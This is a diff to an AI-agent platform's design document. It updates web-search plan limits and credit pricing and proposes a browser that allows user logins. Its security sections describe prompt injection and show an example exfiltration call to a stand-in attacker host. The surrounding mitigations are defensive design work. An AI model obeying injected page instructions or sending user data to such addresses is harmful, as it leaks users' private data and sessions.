@@ -161,9 +161,18 @@ Decided 2026-10-03 (`docs/launch-plan.md` D7 and section 4). One lead and three 
 | `tex` | **Tex** | The lead: the agent the user texts. It plans the job, hands parts to specialists and answers the user | Everything the agent has today |
 | `byte` | **Byte** | Coding: writes and changes code, opens pull requests | Files, shell, git (through the git gateway), the platform tools |
 | `patch` | **Patch** | Code review: runs several reviewers (bugs, security, tests) | Read access to the code, shell for running tests and diffs, the platform tools for commenting |
-| `scout` | **Scout** | Research: searches the web and reads pages. On Max it will also drive a real browser (section 11) | Only `web_search` and `read_page` (and the browser later). **No shell and no app actions** |
+| `scout` | **Scout** | Research: searches the web and reads pages. **Only Scout searches the web.** On Max it will also drive a real browser (section 11) | One web search (the engine's own, or the platform's `web_search`: see "Web search" below), `read_page`, and the browser later. **No shell and no app actions** |
 
 These ids are fixed. Both repos use them.
+
+**Web search: who searches, and with what** (decided 2026-10-04, `docs/launch-plan.md` D7):
+
+- **Only Scout searches the web.** Tex, Byte and Patch hand a search to Scout. The agent image decides who may call a search tool. The platform does not check it: every call from a container arrives with the same container token, so the platform can't tell the crew members apart.
+- **The engine's own search comes first.** When the user's engine has its own web search, Scout uses that one and the platform is not involved. Today that is Claude Code on the user's Claude plan; Codex later. It costs **no credits** and works on **every plan**.
+- **Otherwise the platform's `web_search`,** backed by Brave (section 5.1). It is a **Max feature** (section 7.1) and costs **1 credit per search** (section 7.2). On Free and Pro the tool refuses with a message the agent can read.
+- **What that means on Free and Pro with Hermes** (the user's own API key, or Textcrew AI): Scout can't search. It can still read a page whose address the user gives it; `read_page` is free on every plan.
+- **Which search Scout is given** is set in the agent image (`vm-manager`), per engine. This repo only decides what the platform's tool does when it is called.
+- **Open:** the results of an engine's own search never pass through the platform, so they are not "seen" addresses and `read_page` refuses them today (section 5.1). Whether `read_page` may open them on Claude Code is for the founder to decide (`docs/launch-plan.md` section 2).
 
 **In the agent image** (`vm-manager`, not this repo):
 
@@ -176,13 +185,13 @@ These ids are fixed. Both repos use them.
 
 **On the platform** (this repo):
 
-- **Crew list:** `GET /v1/crew` returns the four members (id, name, lead or specialist, role, description, whether it is available yet), so the apps don't hard-code them. Scout also carries `browser`: the plan it needs (Max) and whether it is built yet (not yet).
+- **Crew list:** `GET /v1/crew` returns the four members (id, name, lead or specialist, role, description, whether it is available yet), so the apps don't hard-code them. Scout also carries `browser`: the plan it needs (Max) and whether it is built yet (not yet). Scout's description says what needs Max (web search through Textcrew, and the browser) and what doesn't (the search built into the user's own Claude plan).
   - **Available yet?** The specialists live in the agent image, and the backend can't see which image is deployed. The setting `CREW_AVAILABLE` lists the specialists that are switched on (default `byte,patch,scout`). Tex is always available.
 - **Progress lines:** when a specialist starts or finishes, the Bridge sends a progress event whose text starts with the member's name and a colon, for example `Scout: reading 4 pages`.
   - **Web chat:** the worker passes every progress line of a turn to the live stream as `agent.progress` (the text, the crew member if the line names one, the time). Lines without a name, such as `using web_search`, go the same way with no member.
   - **Telegram and other chats:** nothing is sent for a progress line. A chat only gets what the agent itself sends with `send_message`, as before, so the user isn't spammed.
   - **Activity log:** a line that names a crew member is also saved (`crew_progress`, with the member), so the activity page shows who did what. At most 30 per turn; the text is cut at 300 characters.
-- **Scout's tools run on the platform,** not in the container: `web_search` and `read_page` on the Platform MCP (section 5.1). The container's network stays locked.
+- **Scout's platform tools run on the platform,** not in the container: `web_search` (Max only) and `read_page` on the Platform MCP (section 5.1). The container's network stays locked.
 - **Pull-request review** uses Patch (section 0.8).
 
 ### 0.8 Pull-request review
@@ -522,8 +531,8 @@ The web app lives in `user-frontend/` and is built from `openapi.yaml` + `ignore
 | list_app_actions | This user's allowed actions (connected apps × plan), each marked with whether it needs approval and whether it costs a credit |
 | schedule_reminder / create_automation / list / cancel | Save + register the timer (plan limits apply) |
 | get_profile | Name, timezone, plan, connected apps |
-| web_search | Scout's search. Asks the search provider from the server and returns titles, links and snippets. A **paid tool**: its cost × 2.5 in credits (section 7.2) |
-| read_page | Scout's page reader. Fetches one public web page from the server and returns its text and links. Only an address already seen for this user (their own messages, a search result, a link on a page already read). Free |
+| web_search | Scout's search through the platform, for an engine with no web search of its own (section 0.7). **Max plan only:** on Free and Pro it refuses with a message for the agent. Asks the search provider (Brave) from the server and returns titles, links and snippets. **1 credit per successful search** (section 7.2) |
+| read_page | Scout's page reader. Fetches one public web page from the server and returns its text and links. Only an address already seen for this user (their own messages, a `web_search` result, a link on a page already read). Free, on every plan |
 | remember | Saves one short fact about the user to the shared memory (section 0.9). Refused: a secret, more than 300 characters, more than 200 memories. Free |
 | recall | Finds the memories that fit a question, best match first; with no question, the latest. Free |
 | forget | Removes a memory, or corrects its text. Free |
@@ -556,12 +565,19 @@ Every call is audit-logged and triggers a vm-manager *Touch*. `/mcp` is closed t
     - The activity log saves the page's address without its query string. A refused address is written to the activity log too (`read_page_refused`) and to the server log, also without its query string: a refusal can be an injected instruction at work, and the user should be able to see it.
     - `robots.txt` is not read: this is one page fetched for one user's question, not a crawler.
   - **`web_search(query)`:**
+    - **When it is used** (decided 2026-10-04): only when the user's engine has no web search of its own (section 0.7). The platform doesn't check the engine. A Max user's call is answered and charged whichever engine made it; giving Scout the right search is the agent image's job.
+    - **Max plan only** (decided 2026-10-04). The user's plan is read at every call. On any other plan the tool answers with a **tool error**, so the agent reads it and the turn goes on:
+      > Web search through Textcrew is part of the Max plan, and your user is not on Max: nothing was searched and nothing was charged. If your engine has its own web search, use that instead. Otherwise tell your user that web search needs the Max plan; they can upgrade in the Textcrew web app. Do not send a link. read_page still opens an address they give you.
+      - Nothing is searched and nothing is charged.
+      - The refusal is written to the activity log (`web_search_refused`, with the query's first 120 characters, like a search that ran), so the user can see why Scout didn't search.
+      - "Do not send a link" is the Telegram rule of section 7.6.
     - **A small provider interface,** chosen by `WEB_SEARCH_PROVIDER`. One provider is built: **Brave Search API** (`GET https://api.search.brave.com/res/v1/web/search`, key in `X-Subscription-Token`). Its "Search" plan was **$5 per 1,000 searches** when checked on 2026-10-04, with $5 of free credit each month (the first 1,000 searches) and 50 searches a second.
     - **No key set (`BRAVE_SEARCH_API_KEY`):** the tool answers that search isn't set up. It is a normal answer, not an error, so the turn goes on.
-    - **Rate limit:** 20 searches a minute per user. At most 10 results per search (the default is 5), each with a title, a link and a snippet.
+    - **Rate limit:** 20 calls a minute per user, counted before anything else, so refused calls count too. At most 10 results per search (the default is 5), each with a title, a link and a snippet.
     - **Refused at zero credits,** like an app action that changes something.
-    - **Charged only on success** (section 7.2). `WEB_SEARCH_COST_USD` is what one search costs us (default 0.005).
+    - **Charged only on success: 1 credit per search** (section 7.2). `WEB_SEARCH_COST_USD` is the cost the charge is worked out from (default 0.004; × 2.5 it is exactly 1 credit).
     - A search the provider fails is an error the agent sees; the turn goes on and nothing is charged.
+    - **The order of the checks:** rate limit → plan → is a provider set up → credits → the search → the charge.
 
 - **App connections:** a connect link saves the connection as `pending`. Three things move it to `active` (or `expired` / `error`), whichever comes first:
   - Composio's webhook (`/webhooks/composio`),
@@ -645,6 +661,7 @@ A timeout (15 min) ends in a force-stop and an error event.
 _Updated 2026-09-29 to match the pricing page: Max $30, automations 1 / 5 / 50, 90-day credits, waitlist offer; model tiers no longer advertised._
 _Updated 2026-10-03 with the launch decisions (`docs/launch-plan.md`): AI three ways, 1 credit per app action that changes something, no purchase links on Telegram. Prices and credits are unchanged._
 _Updated 2026-10-03 (crew package): browser use is a Max feature, a user can choose Textcrew AI over their own AI, web search is the first paid tool._
+_Updated 2026-10-04 (search and browser decisions, `docs/launch-plan.md` D6, D7, D10): Scout's web search through Textcrew is a Max feature too and costs 1 credit per search; the search built into the user's own engine is free on every plan; the browser will allow logins (section 11)._
 
 | | **Free** | **Pro** | **Max** |
 |---|---|---|---|
@@ -655,9 +672,16 @@ _Updated 2026-10-03 (crew package): browser use is a Max feature, a user can cho
 | Priority | – | – | **Priority when things get busy** (queue + awake cap) |
 | Apps (Composio) | 10 | All 25 | All 25 + **own MCP servers** |
 | Automations (a repo with pull-request review on counts as one) | 1 | 5 | 50 |
+| Web search through Textcrew (Scout's `web_search`, backed by Brave; 1 credit per search) | – | – | ✓ |
 | Browser use (Scout's real browser, 2 credits per minute; not built yet, section 11) | – | – | ✓ |
 | Bring your own key | ✓ | ✓ | ✓ |
 | Awake cap priority | Lowest (stopped first when the server is full) | Normal | Highest |
+
+**Scout's two platform services are Max only** (decided 2026-10-04): web search through Textcrew, and the real browser.
+
+- **On Free and Pro** the `web_search` tool refuses with a clear message (section 5.1). Nothing is charged.
+- **Not a plan feature:** the web search built into the user's own engine (Claude Code on their Claude plan today; Codex later). Scout uses it on every plan, at no credits, and the platform is not involved (section 0.7).
+- **`read_page` is on every plan,** and free.
 
 **AI, three ways** (decided 2026-10-03, `docs/launch-plan.md` D4). A user picks one in the web app:
 
@@ -667,7 +691,7 @@ _Updated 2026-10-03 (crew package): browser use is a Max feature, a user can cho
 | 2 | **The user's Claude plan** | Labelled **beta**. Plain text "runs Claude Code"; no Anthropic names or logos beyond that | Claude Code, signed in by the user in their own container | The user, on their Claude plan. No AI charge in credits |
 | 3 | **Textcrew AI** | Paid in credits | Hermes on a model we rent through a model API behind LiteLLM. No self-hosted model | Credits, at real cost × 2.5 (section 7.2). The plan decides which models (table above) |
 
-- **Only the AI part is free with the user's own AI.** Awake time, app actions and paid tools are charged in credits whichever way is chosen.
+- **Only the AI part is free with the user's own AI.** Awake time, app actions and paid tools are charged in credits whichever way is chosen. A web search built into the user's own engine is part of their AI: no credits.
 - **First match wins:** a connected Claude plan with Claude Code chosen, then an own API key, then Textcrew AI.
 - **`AI_ACCESS_MODE`:** `platform` offers Textcrew AI to a user who brought nothing. `own_only` switches Textcrew AI off; such a user is asked to connect their own AI first.
 - **Choosing Textcrew AI anyway** (decided 2026-10-03). A user who has saved a key or connected a Claude plan can still pick Textcrew AI, and switch back:
@@ -689,8 +713,10 @@ _Updated 2026-10-03 (crew package): browser use is a Max feature, a user can cho
 | Container awake time | 1 credit per 10 minutes awake |
 | **App action that changes something** (send, create, update, delete) | **1 credit per successful action** |
 | App action that only reads (get, list, search) | Free |
+| **Web search through Textcrew** (`web_search`, backed by Brave) | **1 credit per successful search** (Max plan) |
+| Web search built into the user's own engine (Claude Code on their Claude plan; Codex later) | Free. It runs on the user's own plan; the platform is not involved |
 | Browser use | 2 credits per minute (Max plan; not built yet, proposal in section 11) |
-| Paid tools (pay-per-use APIs) | Their cost × 2.5. The first one is Scout's web search |
+| Other paid tools (pay-per-use APIs) | Their cost × 2.5. None yet besides web search |
 | Reading a web page (`read_page`) | Free |
 | Jev routing, simple replies | Included in the AI cost |
 | **Failed turns caused by us** (our bug or outage) | **Not charged**; the charge is reversed |
@@ -708,12 +734,19 @@ _Updated 2026-10-03 (crew package): browser use is a Max feature, a user can cho
 - **A turn reversed as our fault** gives back the app-action credits charged during that turn, with the rest of the turn.
 - **Everyone pays it,** including users on their own API key or Claude plan.
 
+**Web search: 1 credit per search** (decided 2026-10-04, `docs/launch-plan.md` D6). Before, a search was charged at Brave's price × 2.5: 1.25 credits, so 1, 1, 1 and 2 credits for four searches.
+
+- **How it is 1 credit:** web search still goes through the paid-tool path below, which charges a configured cost × 2.5. The configured cost of a search (`WEB_SEARCH_COST_USD`) is now **$0.004**. × 2.5 that is $0.01: exactly one credit, with no fraction to carry. So every successful search is exactly 1 credit, also for a user who has older paid-tool charges.
+- **The setting is what the price is worked out from, not Brave's bill.** Brave charges us $0.005 a search, so a search is sold at 2× its cost, not 2.5×. The ledger row keeps the 4,000 micro-dollars the charge was worked out from (`meta.costMicroUsd`).
+- **On the server:** a line `WEB_SEARCH_COST_USD=0.005` left in the server's settings would bring back 1.25 credits. Remove it or set 0.004.
+- **Not charged:** a search refused for the plan (not on Max), a search the provider fails, and a search with no provider set up.
+
 **Paid tools** (decided 2026-10-03):
 
-- **The price is the tool's real cost × 2.5,** as for the AI. One search costs us $0.005 (Brave, `WEB_SEARCH_COST_USD`), so it is 1.25 credits.
-- **Credits are whole numbers, so fractions carry over,** the way awake time does: the platform keeps the user's running total of paid-tool cost and charges each whole credit as it is reached. With search that is 1 credit for three searches and 2 for the fourth: 5 credits for 4 searches, exactly × 2.5. A call never costs less than 1 credit.
+- **The price is the tool's configured cost × 2.5,** as for the AI. For web search the configured cost is $0.004, so the price is 1 credit (above).
+- **Credits are whole numbers, so fractions carry over,** the way awake time does: the platform keeps the user's running total of paid-tool cost and charges each whole credit as it is reached. A tool that costs $0.005 a call would be 1 credit for three calls and 2 for the fourth: 5 credits for 4 calls, exactly × 2.5. A call never costs less than 1 credit.
   - **Where the running total lives:** in the ledger. Each paid-tool charge saves what the call cost us (`meta.costMicroUsd`), and the next charge adds up the user's earlier ones under the user's credit lock. There is no separate counter to drift.
-- **Only success is charged.** A search the provider refuses, or one that isn't set up, costs nothing.
+- **Only success is charged.** A search the provider refuses, one that isn't set up, or one refused for the plan costs nothing.
 - **At zero credits** a paid tool is refused before it runs.
 - **A turn reversed as our fault** gives back the paid-tool credits charged during that turn.
 - **Everyone pays it,** including users on their own API key or Claude plan.
@@ -744,7 +777,7 @@ Credits are held as **grants**. Each grant has an amount, **what's left of it**,
 4. **After each turn** (on *turn done*), the worker also does a quick sync for that user, so the balance stays fresh.
 5. **App actions are charged when they run,** not by the sync: one charge of 1 credit per successful action that changes something, through the same grants and ledger. Each charge has its own unique key, so it can be written only once: the approval id when the action was approved (an approval is single use), otherwise an id made for that one run. The charge shows in the credit history (`App action: <name>`), in the activity log (`creditsCharged`) and in usage (`appActionCredits`).
 
-6. **Paid tools are charged when they run** too, the same way: one charge per successful call, with its own unique key, through the same grants and ledger (`Web search`). It shows in the credit history, in the activity log (`creditsCharged`) and in usage (`toolCredits`).
+6. **Paid tools are charged when they run** too, the same way: one charge per successful call, with its own unique key, through the same grants and ledger (`Web search`, 1 credit). It shows in the credit history, in the activity log (`creditsCharged`) and in usage (`toolCredits`).
 7. **Usage is reported in five parts:** AI, awake time, app actions, browser time and paid tools (`aiCredits`, `awakeCredits`, `appActionCredits`, `browserCredits`, `toolCredits`). Browser time has its own number so screens can label it; the total is the sum of the five.
 
 ### 7.5 Enforcing the balance
@@ -753,6 +786,7 @@ Credits are held as **grants**. Each grant has an amount, **what's left of it**,
 |---|---|
 | **Before a turn** (process-message) | Balance > 0? If not → reply "out of credits" and where to top up, upgrade or redeem a coupon; no container wake. On Telegram the reply names the web app and carries **no link** (section 7.6); other channels get the billing link |
 | **During a turn** | The user's **LiteLLM key budget = their current balance in dollars of real cost**. If they run out mid-turn, LiteLLM refuses → Hermes stops → "out of credits" |
+| **Before a web search through Textcrew** | On the Max plan? If not → the tool tells the agent that web search is part of Max, and to use the engine's own search if it has one. The search does not run and nothing is charged |
 | **Before an app action that changes something, or a paid tool** | Balance > 0? If not → the tool tells the agent the user is out of credits and the action or search does not run |
 | **At zero after a sync** | Set the LiteLLM budget to 0; pause automations |
 | **When credits are added** (payment, coupon, monthly grant) | Raise the LiteLLM budget; un-pause automations |
@@ -1016,7 +1050,9 @@ A small negative balance (one turn's overrun) is allowed and recovered from the 
 
 **Status:** a proposal written 2026-10-03 for `docs/launch-plan.md` D10, checked and completed 2026-10-04. No browser code exists. Prices were read on the providers' own pages on 2026-10-03 and read again on 2026-10-04; every number in 11.3 was the same on both days (links at the end).
 
-**What is wanted:** on the Max plan, Scout can drive a real browser (open a page, click, type, read what a script-heavy page shows) at **2 credits per minute**. `read_page` covers plain pages already; the browser is for pages that need JavaScript, clicks or forms.
+**Decided 2026-10-04** (`docs/launch-plan.md` D10): **the browser allows logins.** The user signs in to a site themselves, inside the browser session; the agent never sees the password. What that needs is in section 11.6. Which option to build, (a) or (b), is still open.
+
+**What is wanted:** on the Max plan, Scout can drive a real browser (open a page, click, type, read what a script-heavy page shows) at **2 credits per minute**. `read_page` covers plain pages already; the browser is for pages that need JavaScript, clicks or forms, and for pages behind a sign-in.
 
 ### 11.1 The two options
 
@@ -1030,8 +1066,8 @@ A small negative balance (one turn's overrun) is allowed and recovered from the 
 | **Memory** | Chromium needs several hundred MB by itself; hosting guides say to give a Chromium container at least 1 GB. Our container limit is 600 MB and an idle container already uses 325 MB. The limit would have to go to about 1.5 GB for Max users | None on our server. The api holds one WebSocket per open session |
 | **Server impact** | The test server has about 5.5 GB for containers: about 15 idle ones today. A browser turn takes the room of 4 of them, so the awake cap must fall or the server must grow. The image grows by several hundred MB, and Chromium under gVisor is slower and needs its own flags | No change to the awake cap or the image |
 | **The locked network** | **Lost for that container.** A browser must reach any site, so the egress proxy would have to allow every domain. Then anything in the container (the user's files, memory, cloned code, a Claude Code sign-in) can be sent anywhere by one injected instruction | **Kept.** The container still reaches only the api, LiteLLM and git. The browser is outside it |
-| **Logged-in sessions** | Cookies would live in the user's `/data` volume on our server, and in the nightly backup | Cookies would live at the provider (Browserbase calls it a context, encrypted at rest). A third party holds them. **Proposed for launch: no saved logins at all** (public pages only) |
-| **Prompt injection** | The browser sits next to the user's data with an open network. This is the dangerous mix, and the platform can't check where the browser goes | The page can only reach what Scout can: `web_search`, `read_page` and the browser tools. Navigation goes through the platform, so the seen-address rule can be applied to it (section 11.5). The worst case is Scout typing something into a page. On Hermes, Scout's tool limits are only instructions (section 0.7), so the platform's checks are what counts |
+| **Logged-in sessions** (allowed, decided 2026-10-04; section 11.6) | **Cookies** live in the browser's profile in the user's `/data` volume on our server, and in the nightly backup. **Signing in:** the user needs a way to see and type into the browser in their container. Nothing like that exists; a remote view through the api would have to be built | **Cookies** live at the provider, in one saved profile per user (Browserbase calls it a context: cookies and site storage, encrypted at rest, deleted through its API). A third party holds them. **Signing in:** the provider's live view of the session, shown inside the web app; the user clicks and types in it |
+| **Prompt injection** | The browser sits next to the user's data with an open network. This is the dangerous mix, and the platform can't check where the browser goes | The page can only reach what Scout can: `web_search`, `read_page` and the browser tools. Navigation goes through the platform, so the seen-address rule can be applied to it (section 11.5). The worst case is Scout typing something into a page, and, on a site the user is signed in to, doing things there as the user (section 11.6). On Hermes, Scout's tool limits are only instructions (section 0.7), so the platform's checks are what counts |
 | **Metering browser minutes** | The Bridge reports browser seconds; the vm-manager already stores them per awake period (`browser_seconds` in *GetUsage*) and the usage sync already reads and charges them. Nothing new on the platform | The api opens and closes every session, so it knows the seconds. The usage sync adds them to the browser seconds it already charges: the same 2 credits per minute, the same carry-over of part minutes, the same `browserCredits` in usage. New: a session table, and closing sessions that were left open |
 | **Plan check** | In the vm-manager and the image | In the tool: not on Max → the tool says so |
 | **Work to build** | Image, vm-manager (memory by plan, egress rules, metering), Bridge tools | Platform tools, one provider client, a session table, the sync. One repo |
@@ -1068,14 +1104,55 @@ Why:
 3. **It fits how Scout already works:** Scout has only platform tools, and the platform checks the plan, meters the minutes and writes the activity log in one place.
 4. **It is the smaller build,** in one repo.
 
-Proposed limits for the first version: Max plan only; one browser session per user; closed after 2 idle minutes and after 15 minutes at most; public pages only (no saved logins, no proxies, no captcha solving); the same address rules as `read_page` for every page the browser is sent to; refused at zero credits; metered per second and charged at 2 credits per minute through the usage sync.
+Proposed limits for the first version: Max plan only; one browser session per user; closed after 2 idle minutes and after 15 minutes at most; logins allowed, with the user signing in themselves (section 11.6; this replaces the earlier proposal of public pages only); no proxies and no captcha solving; the same address rules as `read_page` for every page the browser is sent to; refused at zero credits; metered per second and charged at 2 credits per minute through the usage sync.
 
 **Navigation needs the seen-address rule too** (added 2026-10-04). A browser that opens any address the agent types is the same way out as an unchecked `read_page`: `browser_open("https://attacker.example/?d=<private data>")`. So `browser_open` must take only an address already seen for this user (section 5.1), and links the browser shows count as seen, like links on a read page. Two things are harder than with `read_page` and need their own answer before the browser is built: **typing** (`browser_type` puts agent-chosen text into a page, which is a way out by itself; the first version could allow typing only into a search box on a seen page, or ask for approval), and **requests the page makes by itself** (scripts, images and redirects, which a hosted browser fetches without asking us). With option (a) the platform can't apply the rule at all: the browser sits in the container and the open network is the way out.
 
-**What the founder decides:** option (a) or (b); if (b), which provider and who opens the account; whether Scout may ever stay logged in to a site, and where those cookies may live; how far Scout may type into pages (the way out that the seen-address rule doesn't cover).
+**What the founder decides:** option (a) or (b); if (b), which provider and who opens the account; how far Scout may type into pages (the way out that the seen-address rule doesn't cover); and the open points about logins in section 11.6. Decided already: logins are allowed, and the user signs in themselves (2026-10-04).
 
-**Not checked:** how Browserbase and Steel bill a session that is opened and left idle, the longest session on Browserbase's paid plans, and whether Chromium runs acceptably under gVisor in our image (only needed for option (a)).
+**Not checked:** how Browserbase and Steel bill a session that is opened and left idle, the longest session on Browserbase's paid plans, and whether Chromium runs acceptably under gVisor in our image (only needed for option (a)). For logins: the live view and the saved profile were read in the providers' docs on 2026-10-04 and not tried on a real account; whether Steel keeps cookies between sessions was not found.
 
-**Sources** (read 2026-10-03 and again 2026-10-04): [Browserbase pricing](https://www.browserbase.com/pricing) · [Browserbase contexts](https://docs.browserbase.com/features/contexts) · [Steel pricing and limits](https://docs.steel.dev/overview/pricinglimits) · [Browserless pricing](https://www.browserless.io/pricing) · [Railway's Playwright guide](https://docs.railway.com/guides/playwright) (1 GB for a Chromium container) · our measured container memory: `vm-manager/README.md`.
+**Sources** (read 2026-10-03 and again 2026-10-04): [Browserbase pricing](https://www.browserbase.com/pricing) · [Browserbase contexts](https://docs.browserbase.com/features/contexts) · [Browserbase live view](https://docs.browserbase.com/features/session-live-view) · [Steel pricing and limits](https://docs.steel.dev/overview/pricinglimits) · [Steel: a person in the session](https://docs.steel.dev/overview/sessions-api/human-in-the-loop) · [Browserless pricing](https://www.browserless.io/pricing) · [Railway's Playwright guide](https://docs.railway.com/guides/playwright) (1 GB for a Chromium container) · our measured container memory: `vm-manager/README.md`.
+
+### 11.6 Logins: the user signs in themselves (decided 2026-10-04)
+
+**The decision** (`docs/launch-plan.md` D10): the browser may be used on sites that need a sign-in. **The user signs in themselves. The agent never sees the password.** This replaces the earlier proposal of public pages only. Nothing is built.
+
+**How a sign-in would go:**
+
+1. Scout reaches a sign-in page and stops. It tells the user, through the lead, that the site needs them to sign in.
+2. The user opens the browser session in the **web app** and signs in there: user name, password, a code from their phone. They type into the real page, not into the chat. The session waits for them, so the 2-minute idle limit has to be longer while it waits.
+3. The user says they are done (a button), and Scout goes on, now signed in.
+
+**What that requires:**
+
+- **A way for the user to see and type into the browser session.**
+  - **Option (b), hosted:** the provider's live view. Browserbase's docs describe a live view link that goes in an iframe, where a person can click and type; Steel's describe a session viewer with an `interactive` setting. The api would hand the web app a link for the user's own session only.
+  - **Option (a), in the container:** nothing exists. A remote view of the container's browser, passed through the api, would have to be built. This adds to the work of option (a).
+  - **Telegram** can't show a browser. The chat gets a line that names the web app; the sign-in happens there.
+- **The agent must not see the password.** The browser tools give Scout what a page shows and let it type. So, while the user is signing in:
+  - **the browser tools are paused** for that session: no reading, no typing, no clicking by the agent, until the user says they are done;
+  - **`browser_type` never types into a password field,** at any time, and the agent is never asked to hold a password. A user who sends a password in chat is told to sign in in the web app instead;
+  - what the agent reads from a page **leaves out the values of password fields**.
+- **Somewhere for the sign-in to live** (the session cookies), so the user doesn't sign in again on every turn:
+
+  | | (a) Browser in the container | (b) Hosted browser |
+  |---|---|---|
+  | **Where the cookies live** | In the browser's profile in the user's `/data` volume, on our server | At the provider, in one saved profile per user (a Browserbase context). The platform keeps only the profile's id |
+  | **Who else holds them** | Nobody. They are in our nightly backup, which goes off the server | The provider. Browserbase says contexts are encrypted at rest |
+  | **Who can reach them** | Anything running in the container: the cookies sit next to the agent, its shell and, with option (a), an open network. One injected instruction could send them out | Only the browser. The agent's tools return page text, never cookies; the container never holds them |
+  | **Removing them** | Delete the profile folder; the copies in old backups stay until those are deleted | The provider's delete call, when the user asks and when the account is deleted |
+
+  With logins allowed, this table is a second reason for option (b): in option (a) the user's sign-ins would sit inside the container whose network had to be opened.
+- **A screen for the user:** which sites the browser is signed in to, and a way to sign out of one or of all. Deleting the account removes them.
+
+**What a signed-in browser changes.** On a public page the worst a hostile page can do is make Scout type something. On a site the user is signed in to, Scout acts **as the user**: it can post, buy, delete or change settings by clicking. Scout has no app actions for exactly this reason (section 0.7), and a signed-in browser gives some of that back. Before it is built it needs its own rule, for example: on a signed-in site Scout reads freely, and a click that submits a form asks the user first, like a risky app action (section 5.1).
+
+**For the founder to decide** (all still open):
+
+- **How long a sign-in is kept:** until the user signs out, or for a fixed time (for example 30 days).
+- **Which sites:** any site, or not some kinds (banks, the user's email, password managers).
+- **What Scout may do on a signed-in site** without asking: read only, or also click and submit.
+- **The minutes the user spends signing in:** charged at 2 credits per minute like the rest of the session, or free.
 
 > Hosting, server setup and sizing live in a separate doc, `docs/deployment.md`. They are not needed to write the code.
